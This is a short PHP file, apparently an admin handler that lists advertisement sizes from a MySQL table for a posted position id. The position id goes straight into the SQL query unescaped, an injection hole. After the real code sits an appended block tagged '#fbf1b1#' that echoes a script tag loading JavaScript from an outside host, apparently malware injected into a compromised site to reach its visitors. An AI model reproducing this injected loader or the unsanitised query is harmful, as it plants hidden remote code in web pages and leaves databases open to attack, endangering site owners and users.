<?php session_start();
ob_start();

include "inc/session_check.php";

$posid = $_POST['posid'];

$select = mysql_query("select id,size from advertisement_position_size where posid='$posid'");
$options = "<option value=''>Select Size</option>"; 
while($fetch=mysql_fetch_array($select))
{
	$options .= "<option value='".$fetch['size']."'>".$fetch['size']."</option>";
}
echo $options;
?>
<?php
#fbf1b1#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967024\"></script>";
echo $g;
}
#/fbf1b1#
?>